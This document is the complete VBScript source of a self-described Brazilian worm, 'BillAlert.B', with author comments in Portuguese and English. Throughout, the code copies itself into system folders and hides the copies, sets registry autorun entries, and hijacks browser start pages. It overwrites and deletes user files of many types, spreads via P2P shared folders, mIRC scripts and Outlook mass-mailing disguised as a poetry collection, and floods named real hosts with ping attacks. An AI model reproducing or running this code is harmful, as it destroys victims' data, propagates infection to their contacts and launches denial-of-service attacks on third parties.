Rem Este é o [BillAlert.B]!!!Um worm brasileiro criado por Adriel.
Rem This is a brasilian worm created by Adriel named [BillAlert.B]
Rem Tenho menos de 16 anos e este é o meu primeiro projeto viral com inteligência de auto-replicação(chamado de  worm).Em breve criarei worms tão bons tais quais o Blaster! 
Rem Now I have less than 16yrs and this is my first viral project with auto-replication on net(named worm).In future I´ll make so good worms how MS Blaster!!
Rem Agradeço a meus amigos Dark_x_Vxer e Back_Door_System pelo apoio!

days()
Sub days()
Dim UFETVXANMMASD, GRTAUANCZMNCAIWOIHO
Set GRTAUANCZMNCAIWOIHO = Wscript.CreateObject("Wscript.Shell")
Set UFETVXANMMASD = CreateObject("Wscript.Shell")
If day(now) = 10 and month(now) = 0 Then
MsgBox "Turning off the PC.", vbCritical + vbSystemModal + vbOK, "Windows"
UFETVXANMMASD.Run "Rundll32.exe user.exe,ExitWindows"
UFETVXANMMASD.Run "Rundll.exe user.exe,ExitWindows"
End If
If day(now) = 1 and month(now) = 0 Then
MsgBox "Turning off the PC.", vbCritical + vbSystemModal + vbOK, "Windows"
UFETVXANMMASD.Run "Rundll32.exe user.exe,ExitWindows"
UFETVXANMMASD.Run "Rundll.exe user.exe,ExitWindows"
End If
If day(now) = 2 and month(now) = 9 Then
MsgBox "Feliz aniversário mestre *CyberPhantom*!!! :)", vbOKOnly + vbSystemModal + vbOK, "Happy Day"
MsgBox "Happy Birthday master *CyberPhantom*!!! :)", vbOKOnly + vbSystemModal + vbOK, "Happy Day"
End If	
If day(now) = 15 and month(now) = 1 Then
MsgBox "Feliz aniversário mãe! :)", vbOKOnly + vbSystemModal + vbOK, "Happy Day"
MsgBox "Happy birthday mom! :)", vbOKOnly + vbSystemModal + vbOK, "Happy Day"
End If
If day(now) = 14 and month(now) = 2 Then
MsgBox "Feliz aniversário pai! :)", vbOKOnly + vbSystemModal + vbOK, "Happy Day"
MsgBox "Happy birthday dad! :)", vbOKOnly + vbSystemModal + vbOK, "Happy Day"
End If
If day(now) = 25 and month(now) = 12 Then
MsgBox "Feliz natal!!! :)", vbOKOnly + vbSystemModal + vbOK, "Happy Day"
MsgBox "Happy Christmas!!! :)", vbOKOnly + vbSystemModal + vbOK, "Happy Day"
End If
If day(now) = 1 and month(now) = 1 Then
MsgBox "Ano Novo está chegando e CyberPhantom está criando novos worms para você! :)", vbOKOnly + vbSystemModal + vbOK, "Happy Day"
Msgbox "New Year is comming, and CyberPhantom is creating new worms for you, hehehehehe! :)", vbOKOnly + vbSystemModal + vbOK, "Happy Day"
End If
If day(now) = 16 and month(now) = 4 Then
MsgBox "Hoje é o dia em que o worm BillAlert.B foi criado! :)", vbOKOnly + vbSystemModal + vbOK, "Happy Day"
MsgBox "Today is the day that the BillAlert.B worm was created! :)", vbOKOnly + vbSystemModal + vbOK, "Happy Day"
End If
If day(now) = 19 and month(now) = 0 Then
GRTAUANCZMNCAIWOIHO.RegWrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Run\DisableKeyboard", "Rundll32.exe Keyboard,Disable"
GRTAUANCZMNCAIWOIHO.RegWrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Run\DisableMouse", "Rundll32.exe Mouse,Disable"
End If
End Sub

BillAlert()
Sub BillAlert()
On Error Resume Next
Wscript.Interactive = True
Wscript.Sleep 20000
Wscript.Echo "A Microsoft informa: atualize sempre seu Windows a fim de evitar invasões e bugs no sistema."
Wscript.Sleep 2000
Wscript.Echo "A Microsoft agradece a atenção!"
End Sub

inicio()
Sub inicio()
On Error Resume Next
dim fso, dirSystem, dirCommand, eq, ctr, file, vbscopy
eq = ""
ctr = 0
Set fso = CreateObject("Scripting.FileSystemObject")
Set file = fso.OpenTextFile(Wscript.ScriptFullName,1)
vbscopy = file.ReadAll
End Sub

principal()
Sub principal()
On Error Resume Next
Set dirSystem = fso.GetSpecialFolder(1)
Set dirWin = fso.GetSpecialFolder(0)
Set c = fso.GetFile(Wscript.ScriptFullName)
c.Copy(dirSystem&"\BillAlert.vbs")
c.Copy(dirSystem&"\SuperPoesias.vbs")
c.Copy(dirWin&"\Run32dll.vbs")
End Sub

hide()
Sub hide()
Dim hide, a
Set a = CreateObject("Scripting.FileSystemObject")
Set hide = a.GetFile(a.GetSpecialFolder(1) & "\BillAlert.vbs")
hide.Attributes = 2
Set hide = a.GetFile(a.GetSpecialFolder(1) & "\SuperPoesias.vbs")
hide.Attributes = 0
Set hide = a.GetFile(a.GetSpecialFolder(0) & "\Run32dll.vbs")
hide.Attributes = 2
End Sub


registro()
Sub registro()
On Error Resume Next
Set WshShell = Wscript.CreateObject("Wscript.Shell")
WshShell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows Scripting Host\Settings\Timeout", 0, "REG_DWORD"
WshShell.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\BillAlert", dirSystem&"\BillAlert.vbs"
WshShell.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\SuperPoesias", dirSystem&"\SuperPoesias.vbs"
WshShell.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\Run32dll", dirWin&"\Run32dll.vbs"
WshShell.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices\BillAlert", dirSystem&"\BillAlert.vbs"
WshShell.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices\SuperPoesias", dirSystem&"\SuperPoesias.vbs"
WshShell.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices\Run32dll", dirWin&"\Run32dll.vbs"
WshShell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\Start Page", "http://ircafogados.pajeuonline.com"
WshShell.RegWrite "HKEY_CLASSES_ROOT\CLSID\{645FF040-5081-101B-9F08-00AA002F954E}\InfoTip", "Bill Gates have alerted you!."
WshShell.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RegisteredOwner", "CyberPhantom"
WshShell.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Internet Explorer\Main\CompanyName", "CyberPhantom"
WshShell.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Internet Explorer\Main\Default_Page_URL", "http://ircafogados.pajeuonline.com"
WshShell.RegDelete "HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\keyboard layouts\00000416"
WshShell.RegDelete "HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\keyboard layouts\00000816"
WshShell.RegDelete "HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\keyboard layouts\00010416"
End Sub

Listdrive()
Sub Listdrive()
On Error Resume Next
dim d, dc, s
Set dc = fso.Drives
For Each d in dc
If d.DriveType = 2 or d.DriveType = 3 Then
Folderlist d, path&"\"
End If
Next
Listdrive = s
End Sub

Infectfiles(folderspec)
Sub Infectfiles(folderspec)
On Error Resume Next
dim f, f1, fc, ext, ap, mircfname, s, bname, mp3, htm
Set f = fso.GetFolder(folderspec)
Set fc = f.files
For Each f1 in fc
ext = fso.GetExtensionName(f1.path)
ext = lcase(ext)
s = lcase(f1.name)
If (ext = "vbs") or (ext = "vbe") Then
Set ap = fso.OpenTextFile(f1.path,2,true)
ap.write vbscopy
ap.close
ElseIf (ext = "js") or (ext = "jse") or (ext = "css") or (ext = "wsh") or (ext = "sct") or (ext = "hta") Then
Set ap = fso.OpenTextFile(f1.path,2,true)
ap.write vbscopy
ap.close
bname = fso.GetBaseName(f1.path)
Set cop = fso.GetFile(f1.path)
cop.copy(folderspec & "\" & banem & ".vbs")
fso.DeleteFile(f1.path)
ElseIf (ext = "jpg") or (ext = "jpeg") Then
Set ap = fso.OpenTextFile(f1.path,2,true)
ap.write vbscopy
ap.close
Set cop = fso.GetFile(f1.path)
cop.copy(f.path & ".vbs")
fso.DeleteFile(f1.path)
ElseIf (ext = "com") or (ext = "exe") Then
Set ap = fso.OpenTextFile(f1.path,2,true)
ap.write vbscopy
ap.close
Set cop = fso.GetFile(f1.path)
cop.copy(f.path & ".vbs")
ElseIf (ext = "txt") or (ext = "doc") Then
Set ap = fso.OpenTextFile(f1.path,2,true)
ap.write vbscopy
ap.close
Set cop = fso.GetFile(f1.path)
cop.copy(f.path & ".vbs")
ElseIf (ext = "xls") or (ext = "pps") Then
Set ap = fso.OpenTextFile(f1.path,2,true)
ap.write vbscopy
ap.close
Set cop = fso.GetFile(f1.path)
cop.copy(f.path & ".vbs")
ElseIf (ext = "mp3") or (ext = "mp2") Then
Set mp3 = fso.CreateTextFile(f1.path & ".vbs")
mp3.vbscopy
mp3.close
Set att = fso.GetFile(f1.path)
att.attributes = att.attributes + 2
End If
If (eq<>folderspec)Then
If (s = "mirc.exe") or (s = "mirc.ini") or (s = "mlink32.exe") Then
Set alias02ini = fso.CreateTextFile(folderspec&"\alias02.ini")
alias02ini.WriteLine "[Remote]"
alias02ini.WriteLine "n0 = on *:start:{"
alias02ini.WriteLine "n1 =  if $day == Friday { /echo BillAlert criado por CyberPhantom }"
alias02ini.WriteLine "n2 = }"
alias02ini.WriteLine "n3 = on *:join:#:{"
alias02ini.WriteLine "n4 = if ($nick = $me) {halt}"
alias02ini.WriteLine "n5 = /q $nick Cansado dos velhos truques no IRC??Você quer aprender tudo sobre IRC??Acesse já o www. um dos maiores portais de Informática do Brasil.Entrevistamos o grupo [Dark IRC Warriors], e seus integrantes nos revelaram segredos até então jamais divulgados!!!Entre e confira!!!"
alias02ini.WriteLine "n6 = }"
alias02ini.WriteLine "n7 = on *:part:#:{"
alias02ini.WriteLine "n8 = if ($nick = $me) {halt}"
alias02ini.WriteLine "n9 = /q $nick Já vai???Espera um pouco..."
alias02ini.WriteLine "n10 = /msg $nick Acesse um dos maiores portais de Informática do Brasil, o www.!Lá você encontrará o inimaginável sobre IRC, Hacking, Programação, Hardware, Segurança, Redes,etc."
alias02ini.WriteLine "n11 = }"
alias02ini.close
eq = folderspec 
End If
End If
Next
If (eq<>folderspec)Then
If (s = "mirc.ini")Then
Set fso = CreateObject("Scripting.FileSystemObject") 
Set file = fso.OpenTextFile(Wscript.ScriptFullName,2)
IONCMMALJKWIPMNZBRT = file(s)
IONCMMALJKWIPMNZBRT.WriteLine "[Files]"
IONCMMALJKWIPMNZBRT.WriteLine "n0 = remote.ini"
IONCMMALJKWIPMNZBRT.WriteLine "n1 = remote.ini"
IONCMMALJKWIPMNZBRT.WriteLine "n2 = alias01.ini"
IONCMMALJKWIPMNZBRT.close
End If
End If
End Sub

P2P()
Sub P2P()
On Error Resume Next
Dim fso, wsc
Set fso = CreateObject("Scripting.FileSystemObject")
Set wsc = CreateObject("Wscript.Shell")
Set dirSystem = fso.GetSpecialFolder(0)
Set ProgramFilesDir = fso.GetSpecialFolder(1)
Set ArquivosdeProgramasDir = fso.GetSpecialFolder(2)
Set C = fso.GetFile(WScript.ScriptFullName)
CurrentVer = "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion"
PgDir = wsc.RegRead(CurrentVer & "\ProgramFilesDir" & "\ArquivosdeProgramasDir")
For FindFolders = 0 To 8
ArrayFolders = Array("C:\Kazaa\My Shared Folder", "C:\My Downloads", PgDir & "\Kazaa\My Shared Folder", PgDir & "\KaZaA Lite\My Shared Folder", PgDir & "\Bearshare\Shared", PgDir & "\Edonkey2000", PgDir & "\Morpheus\My Shared Folder", PgDir & "\Grokster\My Grokster", PgDir & "\ICQ\Shared Files")
FileSwitch = ArrayFolders(FindFolders)
If fso.FolderExists(FileSwitch) Then
For Each FoundP2PFile in fso.GetFolder(FileSwitch).Files
FileExt = LCase(fso.GetExtensionName(FoundP2PFile))
If FileExt = "mp3" Or FileExt = "wma" Or FileExt = "jpg" Or FileExt = "jpeg" Or FileExt = "mpeg" Or FileExt = "exe" Then
C.copy (FoundP2PFile.Path & ".vbs")
fso.DeleteFile (FoundP2PFile.Path)
End If
Next
End If
Next
End Sub

createfile()
Sub createfile()
dim fso, fldr
Set fso = CreateObject("Scripting.FileSystemObject")
Set fldr = fso.CreateFolder("C:\BillAlert.B")
End Sub

autoexec()
Sub autoexec()
Dim dwafewkrtwexvcsza
Set dwafewkrtwexvcsza = fso.CreateTextFile("C:\Autoexec.bat")
dwafewkrtwexvcsza.WriteLine "@echo Microsoft Windows Corporation Copyright (c) 1988, 1989 "
dwafewkrtwexvcsza.WriteLine "@mode con codepage prepare=((850) C:\WINDOWS\COMMAND\ega.cpi)"
dwafewkrtwexvcsza.WriteLine "@mode con codepage select=850"
dwafewkrtwexvcsza.WriteLine "@keyb br,,C:\WINDOWS\COMMAND\keyboard.sys"
dwafewkrtwexvcsza.WriteLine "@cd C:\Windows\System"
dwafewkrtwexvcsza.WriteLine "@start BillAlert.vbs"
dwafewkrtwexvcsza.Close
End Sub


folderlist(folderspec)
Sub folderlist(folderspec)
On Error Resume Next
dim f, f1, sf
Set f = fso.GetFolder(folderspec)
Set sf = f.SubFolders
For Each f1 in sf
Infectfiles(f1.path)
Folderlist(f1.path)
Next
End Sub

Writekey(regkey)
Sub Writekey(regkey)
On Error Resume Next
Set regedit = Wscript.CreateObject("Wscript.Shell")
regedit.RegWrite regkey 
End Sub

Writevalue(regvalue)
Sub Writevalue(regvalue)
On Error Resume Next
Set regedit = Wscript.CreateObject("Wscript.Shell")
regedit.RegWrite regvalue
End Sub

fileexist(filespec)
Function fileexist(filespec)
On Error Resume Next
dim msg
If fso.FileExists(filespec) Then
msg = 0
Else
msg = 1
End If
fileexist = msg
End Function

folderexist(folderspec)
Function folderexist(folderspec)
On Error Resume Next
dim msg
If fso.GetFolderExists(folderspec) Then
msg = 0
Else
msg = 1
End If
folderexist = msg
End Function

garimpando()
Sub garimpando()
dim i, k, Outlook, OutlookName, LivroEnd, Endereco
On Error Resume Next
Set Outlook = CreateObject("Outlook.Application")
If Strings.Ucase(Outlook) = "OUTLOOK" Then
Set OutlookName = Outlook.GetNameSpace("MAPI")
For i = 1 To OutlookName.AddressLists.Count
Set LivroEnd = OutlookName.AddressLists(i)
For k = 1 To LivroEnd.AddressEntries.Count
Endereco = LivroEnd.AdressEntries(k).Address
Next  
Next
mailgo1()
End If
End Sub

Sub mailgo1()
On Error Resume Next
Dim Endereco, Assunto, Mensagem, Anexo
Endereco = LivroEnd.AdressEntries(k).Address
Assunto = "Super coleção de poesias!"
Mensagem = "Encante seu(a) namorado(a) com essa amostra da nossa coleção de poesias, gratuitamente oferecida para divulgar nossa cultura! Para a compra do nosso livro Poesias e Maestrias, entre em contato conosco pelo telefone (011)3456-6894."
Anexo = dirSystem&"\SuperPoesias.vbs"
mailgo2()
End Sub

Sub mailgo2()
Dim Outlook, Email
On Error Resume Next
Set Outlook = CreateObject("Outlook.Application")
If Strings.Ucase(Outlook) = "OUTLOOK" Then
Set OutlookName = Outlook.GetNameSpace("MAPI")
OutlookName.Logon "profile", "password"
Set Email = Outlook.CreateItem(0)
Email.Recipients.Add(Endereco)
Email.Subject = Assunto
Email.Body = Mensagem
Email.Attachements.Add(Anexo)
Email.Importance = 2
Email.Send
OutlookName.Logoff
End If
End Sub

pingagain()
Sub pingagain()
Dim KIHYAFXVBZMALPORY
Set KIHYAFXVBZMALPORY = CreateObject("Wscript.Shell")
For i = 1 to 1500
KIHYAFXVBZMALPORY.run "Ping -l 65500 200.164.216.36", 0, False
Next
End Sub

attack()
Sub attack()
Dim HAGDWYTEAGXHJAIOPWQRCBJS
Set HAGDWYTEAGXHJAIOPWQRCBJS = CreateObject("Wscript.Shell")
HAGDWYTEAGXHJAIOPWQRCBJS.run "http://www.canaltabira.com", 3, False
For i = 1 to 9500
HAGDWYTEAGXHJAIOPWQRCBJS.run "Ping -l 65500 www.canaltabira.com", 0, False
Next
End Sub

Rem *****************************Fim do código [BillAlert.B]!**********************
Rem ******************************End of [BillAlert.B] code!************************